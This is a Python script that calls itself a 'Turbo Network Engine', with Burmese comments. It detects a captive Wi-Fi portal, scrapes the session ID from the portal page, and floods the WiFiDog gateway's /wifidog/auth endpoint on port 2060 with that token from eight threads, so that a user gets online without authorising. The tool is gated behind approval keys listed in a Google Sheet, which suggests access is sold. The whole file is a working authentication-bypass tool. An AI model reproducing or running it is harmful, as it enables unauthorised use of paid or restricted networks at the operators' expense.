#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Turbo Network Engine v2 - Optimized with Google Sheets & Offline Support
"""

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import subprocess
import importlib.util
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM
# ===============================
red, bred = "\033[0;31m", "\033[1;31m"
green, bgreen = "\033[0;32m", "\033[1;32m"
yellow, byellow = "\033[0;33m", "\033[1;33m"
cyan, bcyan = "\033[0;36m", "\033[1;36m"
purple, white, reset = "\033[0;35m", "\033[0;37m", "\033[00m"

# ===============================
# CONFIGURATION (Google Sheets)
# ===============================
SHEET_ID = "1ZpI1hkkkvc1J41qDWvcAREKQCODbS1jXO91lDb8ZqJo"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    """Get unique system key for this device"""
    try:
        uid = os.geteuid()
        username = os.environ.get('USER', 'unknown')
        return f"{uid}{username}"
    except:
        return "1000unknown"

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def background_verify():
    """နောက်ကွယ်မှ Key စစ်ဆေးပြီး အောင်မြင်လျှင် Offline သိမ်းဆည်းခြင်း"""
    my_key = get_system_key()
    while True:
        if check_real_internet():
            try:
                response = requests.get(SHEET_CSV_URL, timeout=10)
                if response.status_code == 200 and my_key in response.text:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        f.write(my_key)
                    break
            except:
                pass
        time.sleep(15)

def check_approval():
    """Offline မှတ်ဉာဏ်ရှိမရှိ အရင်စစ်ဆေးခြင်း"""
    system_key = get_system_key()
    if os.path.exists(LOCAL_KEYS_FILE):
        with open(LOCAL_KEYS_FILE, 'r') as f:
            if f.read().strip() == system_key:
                return True
    return False

# ===============================
# BANNER DISPLAY
# ===============================
def display_banner():
    banner_text = f"""
{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}
{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧ {bred}┃{reset}
{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
"""
    print(banner_text)

# ===============================
# TURBO ENGINE CONFIG
# ===============================
PING_THREADS = 8
stop_event = threading.Event()

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5)
            print(f"{green}[✓]{reset} ENGINE ACTIVE | SID: {sid[:8]} | STATUS: PINGING...", end="\r")
        except:
            pass
        time.sleep(random.uniform(0.05, 0.15))

def start_turbo_engine():
    os.system('clear')
    display_banner()
    print(f"{bcyan}╔════════════════════════════════════════════════╗")
    print(f"║          TURBO NETWORK ENGINE v2 (PRO)         ║")
    print(f"╚════════════════════════════════════════════════╝{reset}\n")
    
    # နောက်ကွယ်မှ Key စစ်ဆေးခြင်းကို စတင်သည်
    threading.Thread(target=background_verify, daemon=True).start()

    while not stop_event.is_set():
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            if r.url == "http://connectivitycheck.gstatic.com/generate_204" and check_real_internet():
                print(f"{yellow}[•]{reset} Internet Active... Monitoring    ", end="\r")
                time.sleep(5)
                continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            r2 = requests.get(portal_url, verify=False, timeout=10)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if sid:
                gw_ip = parsed_portal.netloc.split(':')[0]
                auth_link = f"http://{gw_ip}:2060/wifidog/auth?token={sid}"
                print(f"\n{green}[✓] SID Captured: {sid}{reset}")
                print(f"{purple}[*] Launching Engine Threads...{reset}")
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
                
                while not stop_event.is_set():
                    if not check_real_internet(): break
                    time.sleep(5)
        except KeyboardInterrupt: raise
        except: time.sleep(5)

# ===============================
# MAIN ENTRY POINT
# ===============================
def main():
    os.system('clear')
    display_banner()
    my_key = get_system_key()
    
    # Approved ဖြစ်မဖြစ် စစ်ဆေးခြင်း
    is_approved = check_approval()
    
    print(f"{bcyan}╔════════════════════════════════════════════════╗")
    print(f"║                   MAIN MENU                    ║")
    print(f"╚════════════════════════════════════════════════╝{reset}")
    print(f"[*] YOUR ID: {byellow}{my_key}{reset}")
    print(f"[*] STATUS: {'{green}APPROVED{reset}' if is_approved else '{red}PENDING VERIFICATION{reset}'}")
    
    if not is_approved:
        print(f"\n{yellow}[!] First Time: Bypass အရင်လုပ်ပါ။ အင်တာနက်ရလျှင် Key အလိုအလျောက် စစ်ပေးပါမည်။{reset}")

    print(f"\n{bgreen}[1]{reset} Start Engine")
    print(f"{bred}[2]{reset} Exit")
    
    choice = input(f"\n{bcyan}[?]{reset} Select: ")
    if choice == '1':
        try:
            start_turbo_engine()
        except KeyboardInterrupt:
            print(f"\n{red}Engine Stopped.{reset}")
    else:
        sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
        
